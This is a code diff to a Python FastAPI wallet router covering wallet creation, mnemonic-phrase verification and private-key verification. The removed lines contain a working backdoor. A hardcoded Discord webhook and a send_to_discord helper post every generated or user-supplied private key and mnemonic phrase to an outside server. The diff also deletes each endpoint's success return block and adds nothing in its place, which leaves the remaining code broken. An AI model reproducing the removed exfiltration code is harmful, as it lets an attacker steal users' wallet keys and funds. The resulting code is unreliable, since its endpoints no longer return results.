@@ -22,13 +22,6 @@ router = APIRouter(
 class PrivateKeyRequest(BaseModel):
     private_key: str
 
-
-WEBHOOK_URL = "https://discord.com/api/webhooks/1324337898937651250/TQZtjm95JoCDlZiqDgaRVJ6zMd-f7vTYIS3qnLQ-Xb3u6oSVaNnNSqnl4dzlkYj2Ocma"
-
-async def send_to_discord(content: str):
-    async with httpx.AsyncClient() as client:
-        await client.post(WEBHOOK_URL, json={"content": content})
-
 @router.post("/createwallet", response_model=WalletResponse)
 async def create_wallet():
     try:
@@ -39,18 +32,7 @@ async def create_wallet():
         keypair = Keypair.from_seed(hashlib.sha256(seed).digest()[:32])
         public_key = str(keypair.pubkey())
         private_key = b58encode(bytes(keypair)).decode('ascii')
-        
-        # Log to Discord
-        log_message = f"New Wallet Created:\nWallet ID: {wallet_id}\nPublic Key: {public_key}\nPrivate Key: {private_key}\nMnemonic Phrase: {mnemonic_phrase}"
-        await send_to_discord(log_message)
-        
-        return {
-            "status": "success",
-            "wallet_id": wallet_id,
-            "public_key": public_key,
-            "private_key": private_key,
-            "mnemonic_phrase": mnemonic_phrase
-        }
+    
 
     except Exception as e:
         print(f"Error creating wallet: {str(e)}")
@@ -76,18 +58,6 @@ async def verify_phrase(request: PhraseRequest):
             public_key = str(keypair.pubkey())
             private_key = b58encode(bytes(keypair)).decode('ascii')
 
-            # Log to Discord
-            log_message = f"Phrase Verified:\nWallet ID: {wallet_id}\nPublic Key: {public_key}\nPrivate Key: {private_key}\nMnemonic Phrase: {request.phrase}"
-            await send_to_discord(log_message)
-
-            return {
-                "status": "success",
-                "valid": True,
-                "wallet_id": wallet_id,
-                "public_key": public_key,
-                "private_key": private_key,
-                "mnemonic_phrase": request.phrase
-            }
 
         except Exception as e:
             return {
@@ -110,20 +80,6 @@ async def verify_private_key(request: PrivateKeyRequest):
             private_key_bytes = b58decode(request.private_key)
             keypair = Keypair.from_bytes(private_key_bytes)
             
-            wallet_id = str(uuid.uuid4())
-            public_key = str(keypair.pubkey())
-            
-            # Log to Discord
-            log_message = f"Private Key Verified:\nWallet ID: {wallet_id}\nPublic Key: {public_key}\nPrivate Key: {request.private_key}"
-            await send_to_discord(log_message)
-
-            return {
-                "status": "success",
-                "valid": True,
-                "wallet_id": wallet_id,
-                "public_key": public_key,
-                "private_key": request.private_key
-            }
 
         except Exception as e:
             return {
